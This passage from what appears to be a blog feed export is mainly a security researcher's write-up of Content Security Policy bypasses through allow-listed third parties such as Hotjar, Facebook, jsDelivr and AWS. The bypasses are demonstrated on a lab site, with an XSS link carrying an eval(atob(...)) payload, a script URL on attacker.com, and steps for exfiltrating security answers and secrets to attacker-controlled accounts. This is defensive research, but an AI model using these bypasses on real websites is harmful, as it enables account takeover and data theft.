Instead this is a slight modification to do block reads instead and keep it consistent with the other approaches.\n5 – Thread Reader\nFinally, this is a threaded version of (3) where each thread simultaneously opens its own file handle, seeks to its offset and reads a part of the file.\nThis used to be a “bad idea” – multiple concurrent seeks, and concurrent reads would be slow on spinning disks.\nI’m using 10 threads, which is as many cores as my MBP M1 has.\nMeasuring Methodology\nI’m quite simply measuring total execution time of each version when reading a 5G file. I do this using the fantastic hyperfine tool.\nI run each test three times to warm up caches, then I do five measured runs. The tests were run on my 2021 MBP with an M1 chip.\nHyperfine gives the mean of the five runs with standard deviation, as well as a min and max. Finally it gives some stats comparing each run.\nResults\nHere are the results of the run. As you can see the vanilla approach is horribly slow. Over 12x slower than the best approach. The IO reader is slightly faster, but not much, because it isn’t needing to mess with String allocations/conversions. There’s a significant speedup reading blocks, and the buffered reader can do this for you and is even very slightly faster than doing it manually. However, when we switch to concurrent reads, we get a significant speed up – nearly 3x faster than the buffered reader.\n\n\n\n\nConclusion\nIn short, Halvar was right, which isn’t a very controversial statement. However, I was genuinely surprised to see how big a difference it made, and that there’s little to no discussion on the topic. I hope this helps someone somewhere.",
      "content": "One of the things that has often confused me is how little good advice there is for reading large files efficiently when writing code.\n\n",
      "contentSnippet": "One of the things that has often confused me is how little good advice there is for reading large files efficiently when writing code.",
      "guid": "https://sensepost.com/blog/2023/reading-large-files-and-perf/",
      "isoDate": "2023-09-19T08:08:18.000Z",
      "itunes": {}
    },
    {
      "title": "Dress Code – The Talk",
      "link": "https://sensepost.com/blog/2023/dress-code-the-talk/",
      "pubDate": "Wed, 23 Aug 2023 16:29:05 +0000",
      "content:encoded": "<h2 class=\"wp-block-heading\">TL;DR </h2>\n\n\n\n<p>This post is a summary of the contents of my talk in <a href=\"https://www.appsecvillage.com/events/dc-2023\">Defcon 31 AppSec Village</a> last August 2023, and part of what I will explain in Canada at the <a href=\"https://www.blackhat.com/sector/2023/briefings/schedule/index.html#dress-code---analysis-of-the-current-status-of-the-content-security-policy-34050\">SecTor</a> conference on the 24th of October 2023 at 4:00 PM.</p>\n\n\n\n<p>There are two (big) blocks in this post. Sorry for the length &lt;(_ _)&gt;:</p>\n\n\n\n<ol>\n<li>The <a href=\"#status\">first part</a> is about the not so well-known CSP bypasses that I found during this research. These can be of use in your next pentest, bug bounty, etc. Have a look at the 8 third-party domains that can be abused to bypass a strict policy to execute that sweet Cross-Site Scripting (XSS) or clickjacking proof of concept that was initially being blocked.</li>\n\n\n\n<li>The <a href=\"#bypasses\">second part</a> takes a step back and delves into the process of getting Content-Securiy-Policy (CSP) data from top 1 million sites and the conclusions I draw from it. After reading this part you will get a sense of how widespread and well-implemented CSP is across the Internet. You will also learn the common pitfalls people fall into when implementing the policy. The tool I wrote to scan and collect this information and review the results can be found in <a href=\"https://github.com/sensepost/dresscode\">https://github.com/sensepost/dresscode</a> </li>\n</ol>\n\n\n\n<h2 class=\"wp-block-heading\">Index</h2>\n\n\n\n<ul>\n<li><a href=\"#context\">Context</a></li>\n\n\n\n<li><a href=\"#bypasses\">Bypasses</a>\n<ol>\n<li><a href=\"#lab\">Lab Environment</a></li>\n\n\n\n<li><a href=\"#hotjar\">Hotjar</a></li>\n\n\n\n<li><a href=\"#facebook\">Facebook</a></li>\n\n\n\n<li><a href=\"#jsdelivr\">JSDelivr</a></li>\n\n\n\n<li><a href=\"#amazonaws\">Amazon AWS</a></li>\n\n\n\n<li><a href=\"#others\">Cloudfront, Azure, Heroku, Firebase</a></li>\n</ol>\n</li>\n\n\n\n<li><a href=\"#status\">CSP Health Status</a>\n<ul>\n<li><a href=\"#architecture\">The Architecture</a></li>\n\n\n\n<li><a href=\"#dashboard-health\">Dashboard &#x2013; CSP Health Status</a></li>\n</ul>\n</li>\n\n\n\n<li><a href=\"#conclusions\">Conclusions</a></li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"context\">Context</h2>\n\n\n\n<p>Last year I was working on a web application assessment, one of these assessments that are repeated every year in which the analyst has to face a hardened application. Therefore, every year, the report gets smaller and smaller when we look at the number of vulnerabilities. </p>\n\n\n\n<p>By reading the previous year&#x2019;s assessment report I spotted a nice stored XSS. When I went to replicate it, I found a relatively stringent <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">Content Security Policy</a> (CSP), which contained the directive &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src\">script-src</a>&#x201D; allowing only &#x201C;<a href=\"https://content-security-policy.com/nonce/\">nonced</a>&#x201D; scripts. This policy prevented me from exploiting the same stored XSS. I also found many other XSS vectors within the page, but all of them were prevented by the CSP policy. I was sad.</p>\n\n\n\n<p>After recovering from the down, I thought I should find a way to bypass their CSP. Long story short, I found a way by injecting my own JavaScript code into a legitimate <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval\">eval</a> function used within an allowed script (one that had the adequate nonce). In addition to that I was able to exploit other reflected XSS vectors to carry out a <a href=\"https://owasp.org/www-community/attacks/Clickjacking\" data-type=\"link\" data-id=\"https://owasp.org/www-community/attacks/Clickjacking\">UI Redressing attack</a> to mimic a login panel and exfiltrate harvested credentials to <a href=\"https://www.google-analytics.com\">www.google-analytics.com</a>.</p>\n\n\n\n<p>From that moment I became obsessed with finding new ways to bypass CSP that were not so well documented or known out there. It is not my intention to explain the two previous vulnerabilities here, but instead to show the results of the subsequent research on CSP. </p>\n\n\n\n<p>The outcome of that research was twofold:</p>\n\n\n\n<ol>\n<li>To find new ways to bypass CSP which I can add to my toolbox for future assessments.</li>\n\n\n\n<li>To obtain a better view of the health status of CSP across the Internet.</li>\n</ol>\n\n\n\n<p>So, lets dive into each topic separately, let&#x2019;s start with the more practical section, the bypasses:</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"bypasses\">1 &#x2013; Bypasses</h2>\n\n\n\n<p>You will be able to see the current health status of CSP accross Internet in the <a href=\"#status\">section #2</a>, but for the practical folks, here are the bypasses I found during the research. </p>\n\n\n\n<p><strong>Disclaimer</strong>: I found a lot of information out there to bypass CSP by using JSON with padding (JSONP) and loading outdated AngularJS libraries (e.g. <a href=\"https://github.com/google/csp-evaluator/blob/master/allowlist_bypasses/json/jsonp.json\">here</a>, <a href=\"https://hurricanelabs.com/blog/bypassing-csp-with-jsonp-endpoints/\">here</a> and <a href=\"https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs\">here</a>), but I wanted to explore new ways to bypass the policies.</p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"792\" height=\"792\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image.jpg\" alt=\"\" class=\"wp-image-68852\" style=\"width:529px;height:529px\"></a></figure>\n\n\n\n<p>I found six new third-parties to abuse to bypass CSP controls and two additional ones that were being exploited in bug bounty programs and publicly talked about, but not very well known. </p>\n\n\n\n<p>Regarding the six new vectors, I was not able to easily find public information describing how to use them to bypass CSP. Nevertheless, I think the eight of them deserve to be more popularised, so as a pentester, you can use them in your future assessments or bug bounties, and as a defender or developer, you can avoid them when defining your site&#x2019;s CSP.</p>\n\n\n\n<p>Here&#x2019;s the list of third parties that I found you can easily abuse when you find them in a CSP, some of them will be useful to exfiltrate data from the target site when found in directives such as &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src\">connect-src</a>&#x201C;, and some others to execute code when found in directives such as &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src\">script-src</a>&#x201C;:</p>\n\n\n\n<style>\ntable, th, td {\n  border: 1px solid;\n  border-collapse: collapse;\n  padding: 0.5em;\n  line-height: 1.4;\n  border-color: #332828;\n}\n</style>\n\n\n\n<figure class=\"wp-block-table\"><table><tbody><tr><td><strong>#</strong></td><td><strong>Entity</strong></td><td><strong>Allowed Domain</strong></td><td><strong>Capabilities</strong></td><td><strong>Publicly Documented</strong></td><td><strong>Number of Sites</strong></td></tr><tr><td>1</td><td><strong><a href=\"#facebook\">Facebook</a></strong></td><td>www.facebook.com,<br>*.facebook.com</td><td>Exfil</td><td>No</td><td>7310</td></tr><tr><td>2</td><td><strong><a href=\"#hotjar\">Hotjar</a></strong></td><td>*.hotjar.com, <br>ask.hotjar.io</td><td>Exfil</td><td>No</td><td>2824</td></tr><tr><td>3</td><td><strong><a href=\"#jsdelivr\">Jsdelivr</a></strong></td><td>*.jsdelivr.com,&#xA0;<br>cdn.jsdelivr.net</td><td>Exec</td><td>Yes</td><td>2208</td></tr><tr><td>4</td><td><strong><a href=\"#others\">Amazon CloudFront</a></strong></td><td>*.cloudfront.net</td><td>Exfil, Exec</td><td>No</td><td>1441</td></tr><tr><td>5</td><td><strong><a href=\"#amazonaws\">Amazon AWS</a></strong></td><td>*.amazonaws.com</td><td>Exfil, Exec</td><td>No</td><td>860</td></tr><tr><td>6</td><td><strong><a href=\"#others\">Azure Websites</a></strong></td><td>*.azurewebsites.net,&#xA0;<br>*.azurestaticapps.net</td><td>Exfil, Exec</td><td>No</td><td>90</td></tr><tr><td>7</td><td><strong><a href=\"#others\">Salesforce Heroku</a></strong></td><td>*.herokuapp.com</td><td>Exfil, Exec</td><td>No</td><td>25</td></tr><tr><td>8</td><td><strong><a href=\"#others\">Google Firebase</a></strong></td><td>*.firebaseapp.com</td><td>Exfil, Exec</td><td>Yes</td><td>19</td></tr></tbody></table><figcaption class=\"wp-element-caption\">Eight third party sites that can be used to bypass CSP</figcaption></figure>\n\n\n\n<p>In the last column, you can see the number of sites that I found within the top 1 million where the &#x201C;Allowed Domain&#x201D; was present in their CSP. I have ignored <a href=\"https://www.google-analytics.com\">www.google-analytics.com</a> on purpose here, as we already had a lot of information out there to bypass CSP using Google Analytics (e.g. <a href=\"https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp\">here</a> and <a href=\"https://labs.detectify.com/2018/01/19/google-analytics-data-extraction/\">here</a>) and I wanted to explore new vectors.</p>\n\n\n\n<p>Please, do not take this as a comprehensive list of third-party domains that can be abused to bypass CSP, there might be others out there that I haven&#x2019;t tested, therefore, don&#x2019;t consider your CSP 100% secure if you don&#x2019;t have these domains in your CSP. Always be cautions about what third party domains you trust within your CSP.</p>\n\n\n\n<h3 class=\"wp-block-heading\" id=\"lab\">Lab Environment</h3>\n\n\n\n<p>To demonstrate the bypasses, I could have used any site found on my database, but I prefer not to go to jail just for some dummy demos, so I created a lab to demonstrate potential impact of the bypasses. The lab is a site, called Keyfc, where you can login and access a private page:</p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/website-one-ec.png\"><img loading=\"lazy\" decoding=\"async\" width=\"993\" height=\"701\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/website-one-ec.png\" alt=\"\" class=\"wp-image-70868\" style=\"aspect-ratio:1.3950953678474114;width:604px;height:auto\"></a></figure>\n\n\n\n<p>The private page will have the secret ingredient of the Keyfc recipe:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/website-two.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1017\" height=\"358\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/website-two.png\" alt=\"\" class=\"wp-image-70865\"></a></figure>\n\n\n\n<p>It also has a section to change your profile data, such as email, password or security questions and answers:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/website-three.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1025\" height=\"661\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/website-three.png\" alt=\"\" class=\"wp-image-70866\"></a></figure>\n\n\n\n<p>I added two vulnerabilities to this page. The first one (vulnerability #1) is present in the file secret.php:</p>\n\n\n\n<script src=\"https://gist.github.com/felmoltor/ef24a47afe056781161d6442b592a061.js\"></script>\n\n\n\n<p>You can see that whatever you pass to the parameter &#x201C;msg&#x201D; will be injected within the allowed script. So, if you visit the following URL, you will get the following HTML code in response:</p>\n\n\n\n<script src=\"https://gist.github.com/felmoltor/53bfd0695561178f5fee815384370b58.js\"></script>\n\n\n\n<p>The second vulnerability (vulnerability #2) will be found in the same page &#x201C;secret.php&#x201D; and it will just include in the DOM a new script with its source pointing to the URL passed through the parameter &#x201C;source&#x201D;:</p>\n\n\n\n<script src=\"https://gist.github.com/felmoltor/d6a149cfa35f80be353561eb7f1da181.js\"></script>\n\n\n\n<p>So, if we try to load a script controlled by an attacker by visiting the following URL:</p>\n\n\n\n<pre class=\"wp-block-preformatted\">https://&lt;site&gt;/secret.php?source=https://attacker.com/exec.js</pre>\n\n\n\n<p>The script &#x201C;exec.js&#x201D; hosted in the attacker&#x2019;s controlled domain would be executed. Of course, if the CSP has an allowlist within the &#x201C;script-src&#x201D; and the domain &#x201C;attacker.com&#x201D; is not there, the script will never be executed and we would get the following error in the console of our browser/agent:</p>\n\n\n\n<pre class=\"wp-block-code\"><code><mark style=\"background-color:rgba(0, 0, 0, 0);color:#ff0000; text-wrap: balance;\" class=\"has-inline-color\">Refused to load the script &apos;https://attacker.com/exec.js&apos; because it violates the following Content Security Policy directive: &quot;script-src [...]&quot;. Note that &apos;script-src-elem&apos; was not explicitly set, so &apos;script-src&apos; is used as a fallback.</mark></code></pre>\n\n\n\n<p>So, let&#x2019;s find ways to bypass this restriction.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Proof of Concepts</h3>\n\n\n\n<p>The following sections will explain the process of bypassing CSP through third party abuse. </p>\n\n\n\n<h3 class=\"wp-block-heading\" id=\"hotjar\">Abuse #1 &#x2013; Hotjar</h3>\n\n\n\n<p>This one allows an attacker to exfiltrate data, pretty much as we would do with the classical <a href=\"http://www.google-analytics.com\">www.google-analytics.com</a> exfiltration. An example CSP vulnerable to this would be the following:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>default-src &apos;self&apos; ask.hotjar.io *.hotjar.com;?\nscript-src &apos;nonce-zM1mRhUyMJ13LFoja7kkF2pH&apos; *.hotjar.com;\n[...]</code></pre>\n\n\n\n<p>For exfiltration purposes, instead of the &#x201C;default-src&#x201D;, we could work with a CSP that specified &#x201C;connect-src&#x201D; directive as well.</p>\n\n\n\n<p>As an attacker, if we wanted to exfiltrate the security question and answer of a target user, we would not be able to exfiltrate to a random domain, so we would need to use Hotjar for that purpose. For that, we follow these general steps (have in mind this is just one example, but there could be many other ways to exfiltrate to Hotjar):</p>\n\n\n\n<ol>\n<li>Open an account in <a href=\"https://www.hotjar.com/\">Hotjar</a></li>\n\n\n\n<li>Create a poll to insert in the attacker&#x2019;s controlled site</li>\n\n\n\n<li>Sniff your HTTP traffic and answer the poll</li>\n\n\n\n<li>Mimic that &#x201C;poll answer&#x201D; in the victim-side</li>\n\n\n\n<li>Obtain the &#x201C;poll answer&#x201D; in your attacker&#x2019;s hotjar dashboard.</li>\n</ol>\n\n\n\n<p>This is the code to exfiltrate to Hotjar that we need to execute on the victim&#x2019;s agent:</p>\n\n\n\n<script src=\"https://gist.github.com/felmoltor/95e77cd4bccc266562613f94eca7630b.js\"></script>\n\n\n\n<p>If we encode the previous PoC to Base64 and take advantage of the vulnerability #1 (XSS) present in the page &#x201C;secret.php&#x201D; of the target page, we would end up with a link similar to this one:</p>\n\n\n\n<pre class=\"wp-block-preformatted\">https://hotjar.keyfc.xyz/secret.php?msg=hello%22;eval(atob(%22ZmV0Y2[...]bGUucGIGk7Cn0pOwo%3d%22));//</pre>\n\n\n\n<p>If we make the victim click on this link or a shortened version of it (via <a href=\"https://blog.sensepost.com/?p=17582\" data-type=\"post\" data-id=\"17582\">bit.ly</a> or any other URL shortener service) we will have the security question and answer exfiltrated to our Hotjar dashboard:</p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-2.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"841\" height=\"619\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-2.jpg\" alt=\"\" class=\"wp-image-68896\" style=\"width:610px;height:448px\"></a><figcaption class=\"wp-element-caption\">Security question and answer exfiltrated to the attacker&#x2019;s Hotjar account</figcaption></figure>\n\n\n\n<h3 class=\"wp-block-heading\" id=\"facebook\">Abuse #2 &#x2013; Facebook</h3>\n\n\n\n<p>This one allows an attacker to exfiltrate data to a <a href=\"https://developers.facebook.com/\">Facebook developer</a> dashboard. I found more than 7K sites in my DB that allowed &#x201C;www.facebook.com&#x201D; or &#x201C;*.facebook.com&#x201D; in the CSP directive. </p>\n\n\n\n<p>To put this finding in perspective, the &#x201C;golden standard&#x201D; to exfiltrate data bypassing CSP could be considered &#x201C;<a href=\"https://marketingplatform.google.com/about/analytics/\">Google Analytics</a>&#x201C;, for which, there are a lot of blog posts and articles describing how to do it (e.g. <a href=\"https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp\">here</a> and <a href=\"https://hackerone.com/reports/199779\">here</a>). For this case, I found 6K sites in my DB allowing &#x201C;google-analytics.com&#x201D; in their CSP. Despite the similar prevalence of both technologies, it is interesting how exfiltrating data with Facebook is not very well known and, up to my knowledge, no public blog posts describing this can be found on the Internet.</p>\n\n\n\n<p>An example CSP vulnerable to this would be the following:</p>\n\n\n\n<pre class=\"wp-block-preformatted\">default-src &apos;self&apos; www.facebook.com;\nscript-src &apos;nonce-3FahAWXnLOYTy8KNO3V6Fsmd&apos; *.facebook.net;\n[...]</pre>\n\n\n\n<p>In this case, if an attacker wanted to exfiltrate the secret ingredient from the target page, the general process would be the following (heads-up, this is not a detailed step by step):</p>\n\n\n\n<ol>\n<li>Create a Facebook Developer account&#xA0;<a href=\"https://developers.facebook.com/\">here</a>.</li>\n\n\n\n<li>Create a new &#x201C;Facebook Login&#x201D; app and select &#x201C;Website&#x201D;.</li>\n\n\n\n<li>Go to &#x201C;Settings -&gt; Basic&#x201D; and get your &#x201C;App ID&#x201D;</li>\n\n\n\n<li>In the target site you want to exfiltrate data from, you can exfiltrate data by directly using the Facebook SDK gadget &#x201C;<a href=\"https://developers.facebook.com/docs/meta-pixel/implementation/conversion-tracking/\">fbq</a>&#x201D; through a &#x201C;<a href=\"https://developers.facebook.com/docs/meta-pixel/implementation/conversion-tracking/#tracking-custom-events\">customEvent</a>&#x201D; and the data payload.</li>\n\n\n\n<li>Go to your App &#x201C;Event Manager&#x201D; and select the application you created (note the event manager could be found in an URL similar to this: <a href=\"https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events\">https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events</a> </li>\n\n\n\n<li>Select the tab &#x201C;Test Events&#x201D; to see the events being sent out by &#x201C;your&#x201D; web site.</li>\n</ol>\n\n\n\n<p>This is the code we want to execute on the victim&#x2019;s browser:</p>\n\n\n\n<script src=\"https://gist.github.com/felmoltor/311a22a77e7c338ff97817579dd786d3.js\"></script>\n\n\n\n<p>The first line would initialise the Facebook tracking pixel to point to the attacker&#x2019;s controlled account. The second line would exfiltrate the secret ingredient as a custom event generated in the page.</p>\n\n\n\n<p>If, by any way, we manage to execute that code in the victim&#x2019;s browser, we will see the following in our Facebook Developer account event manager:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-3.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"820\" height=\"580\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-3.jpg\" alt=\"\" class=\"wp-image-68903\"></a><figcaption class=\"wp-element-caption\">Secret ingredient exfiltrated to the attacker&#x2019;s Facebook Developer Event Manager.</figcaption></figure>\n\n\n\n<h3 class=\"wp-block-heading\" id=\"jsdelivr\">Abuse #3 &#x2013; JS Delivr</h3>\n\n\n\n<p>In this case, using <a href=\"https://www.jsdelivr.com/\">jsdelivr</a> we would be able to execute code. </p>\n\n\n\n<p><em>I have found this method already being reported on some HackerOne reports, so I&#x2019;m not claiming this one is originally discovered here, but I think the method is not really well-known, so let&#x2019;s spread awareness on this one a bit more. </em></p>\n\n\n\n<p>This is a sample CSP that can be bypassed:</p>\n\n\n\n<pre class=\"wp-block-preformatted\">default-src &apos;self&apos;;\nscript-src &apos;nonce-3FahAWXnLOYTy8KNO3V6Fsmd&apos; cdn.jsdelivr.net;\n[...]</pre>\n\n\n\n<p>Assuming our objective now is to change the victim user password and security answer, we can use the following payload:</p>\n\n\n\n<script src=\"https://gist.github.com/felmoltor/2f050b18036b46ed85559baeea19e1b2.js\"></script>\n\n\n\n<p>The general steps to follow to execute this payload on the target site that allows cdn.jsdelivr.net would be the following:</p>\n\n\n\n<ol>\n<li>Upload your payload to a new repository in <a href=\"https://github.com/\">GitHub</a> or <a href=\"https://www.npmjs.com/\">npm</a>.</li>\n\n\n\n<li>Ask jsdelivr.com nicely to cache your code by following a very specific URL pattern like this:\n<ul>\n<li>Github: https://cdn.jsdelivr.net/gh/user/repo@version/file</li>\n\n\n\n<li>NPM: https://cdn.jsdelivr.net/npm/package@version/file </li>\n</ul>\n</li>\n\n\n\n<li>Exploit vulnerability #2 by sending the allowed cached script in cdn.jsdelivr.net.</li>\n</ol>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-4.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"478\" height=\"475\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-4.jpg\" alt=\"\" class=\"wp-image-68905\"></a><figcaption class=\"wp-element-caption\">Upload payload to GitHub</figcaption></figure>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-5.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"766\" height=\"433\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-5.jpg\" alt=\"\" class=\"wp-image-68906\" style=\"width:610px;height:344px\"></a><figcaption class=\"wp-element-caption\">Ask jsdeliver.net to cache your payload</figcaption></figure>\n\n\n\n<p>Now, to exploit vulnerability #2 in our lab, we just need to send the following link to the victim and hope they click it:</p>\n\n\n\n<pre class=\"wp-block-preformatted\">https://jsdelivr.keyfc.com/secret.php?source=https://cdn.jsdelivr.net/gh/felmoltor/bunchofjs/exec.js</pre>\n\n\n\n<p>If the victim clicks on it, the code in &#x201C;exec.js&#x201D; will be executed and the password and security answer will be changed:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-6.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"612\" height=\"599\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-6.jpg\" alt=\"\" class=\"wp-image-68917\"></a><figcaption class=\"wp-element-caption\">Payload executed from cdn.jsdelivr.net</figcaption></figure>\n\n\n\n<h3 class=\"wp-block-heading\" id=\"amazonaws\">Abuse #4 &#x2013; Amazon AWS</h3>\n\n\n\n<p>Using Amazon AWS we would be able to exfiltrate data, but I am confident that it can also be used to execute code. This is a sample CSP that can be bypassed:</p>\n\n\n\n<pre class=\"wp-block-preformatted\">default-src &apos;self&apos;;\nscript-src &apos;nonce-3FahAWXnLOYTy8KNO3V6Fsmd&apos; *.amazonaws.com;\n[...]</pre>\n\n\n\n<p>We need to create two components in our Amazon AWS account:</p>\n\n\n\n<ol>\n<li>An API Gateway that will be public as a subdomain of amazonaws.com</li>\n\n\n\n<li>A Lambda function to decode the exfiltrated data coming from the API Gateway as a parameter</li>\n</ol>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-7.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"841\" height=\"606\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-7.jpg\" alt=\"\" class=\"wp-image-68924\"></a><figcaption class=\"wp-element-caption\">The exfiltration infrastructure on Amazon AWS that bypasses CSP</figcaption></figure>\n\n\n\n<p>The code to execute on the victim&#x2019;s browser and the Lambda function code is the following:</p>\n\n\n\n<script src=\"https://gist.github.com/felmoltor/e1309771c1a2478cc5f9c08a1dea17b1.js\"></script>\n\n\n\n<p>If we get that code executed on the victim&#x2019;s browser, we will have the following in the attacker&#x2019;s CloudWatch logs:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-8.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"869\" height=\"436\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-8.jpg\" alt=\"\" class=\"wp-image-68927\"></a></figure>\n\n\n\n<h3 class=\"wp-block-heading\" id=\"others\">Abuses #5, #6, #7, and #8</h3>\n\n\n\n<p>I don&#x2019;t want to make this post longer than it already is, so the other four PoCs are briefly mentioned here. It covers the following four third-party providers:</p>\n\n\n\n<ul>\n<li>Azure AppServices and Static Webapps (~100 sites in the DB)</li>\n\n\n\n<li>Amazon Cloudfront (~100 sites)</li>\n\n\n\n<li>Salesforce Heroku  (~18 sites)</li>\n\n\n\n<li>Google Firebase (~15 sites)</li>\n</ul>\n\n\n\n<p>These four third-party services were not found frequently in the top 1 million sites database, but you never know when you will find them on your next pentest or bug bounty, so they might be useful to you.</p>\n\n\n\n<p>Due to the similarity to the PoC #4, you need just to be aware that the general approach to each of them would be the same:</p>\n\n\n\n<ol>\n<li>Register an account with the third party</li>\n\n\n\n<li>Follow their guidelines to setup a web application or hosting a project with them, e.g.:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<ul>\n<li>Azure <a href=\"https://learn.microsoft.com/en-us/azure/app-service/overview\">AppServices</a> and <a href=\"https://learn.microsoft.com/en-us/azure/static-web-apps/\">Static Webapps</a></li>\n\n\n\n<li>Amazon <a href=\"https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Introduction.html\">Cloudfront</a></li>\n\n\n\n<li>Heroku <a href=\"https://devcenter.heroku.com/articles/git\">Hosting</a></li>\n</ul>\n\n\n\n<ul>\n<li>Firebase <a href=\"https://firebase.google.com/docs/hosting/quickstart\">Hosting</a></li>\n</ul>\n</li>\n\n\n\n<li>Upload the attacker payloads to these projects</li>\n\n\n\n<li>Take advantage of the hole in the CSP that allows these third-party domains. For example, to exploit the vulnerability #2 of the laboratory you send the following links to the victim:\n<ul>\n<li>https://cloudfront.keyfc.com/secret.php?source=https://d15xoolnwhr08.cloudfront.net/js/exec.js</li>\n\n\n\n<li>https://azure.keyfc.com/secret.php?source=https://nice-dune-08c8da410.3.azurestaticapps.net/exec.js&#xA0;</li>\n\n\n\n<li>https://heroku.keyfc.com/secret.php?source=https://exfiltest-75310ac89c2a.herokuapp.com/exec.js</li>\n\n\n\n<li>https://firebase.keyfc.com/secret.php?source=https://demo-defcon.firebaseapp.com/exec.js&#xA0;</li>\n</ul>\n</li>\n</ol>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"status\">2 &#x2013; CSP Health Status</h2>\n\n\n\n<p><em><strong>Note</strong>: I am assuming you have previous knowledge of what CSP is and what this security mechanism is. Otherwise, refer to the <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\">Mozilla</a> site for more information.</em></p>\n\n\n\n<p>To obtain a better view of the state of CSP on the Internet, I needed to gather the HTTP headers myself, explore them, parse the CSP information out from these and reach some conclusions. So I decided to retrieve this information from the top 1 million sites on the Internet (In this case: <a href=\"https://majestic.com/reports/majestic-million\">Majestic Million</a> and <a href=\"https://github.com/PeterDaveHello/top-1m-domains/blob/master/backup/umbrella.zip\">Cisco Umbrella</a>). For this to work I needed to program something scalable that could scan all those web sites in a reasonable amount of time. </p>\n\n\n\n<h3 class=\"wp-block-heading\" id=\"architecture\">The Architecture</h3>\n\n\n\n<p>I needed to make some architectural decisions here, such as what database to store the scrapped data into and the programming paradigm to do the scans and parsing of data.</p>\n\n\n\n<p>Regarding the database, I started with a SQLite3 database, jumped later to MySQL in various forms and finally moved to MongoDB. To help me make a decision on which one of them to use, I draw a chart of the time taken to process and introduce 10.000 entries with HTTP header data. </p>\n\n\n\n<p>The orange line, which represented MongoDB, was clearly the winner in this contest:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-19.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"473\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-19-1024x473.png\" alt=\"\" class=\"wp-image-68467\"></a><figcaption class=\"wp-element-caption\">Comparison between SQLite3, MySQL, MySQL using foreign keys, and MongoDB</figcaption></figure>\n\n\n\n<p>Ok, so now that I have decided what database to use, let&#x2019;s jump into comparing the different programming paradigms. </p>\n\n\n\n<p>I wanted to compare a classical <em>for</em> loop requesting the headers sequentially with the python library &#x201C;<a href=\"https://requests.readthedocs.io/en/latest/\">requests</a>&#x201D; with an asynchronous programming approach using the python library &#x201C;<a href=\"https://docs.aiohttp.org/en/stable/\">aiohttp</a>&#x201C;.</p>\n\n\n\n<p>I like charts, so let&#x2019;s compare each approach. Here is the time taken to poll the headers of 500 web sites 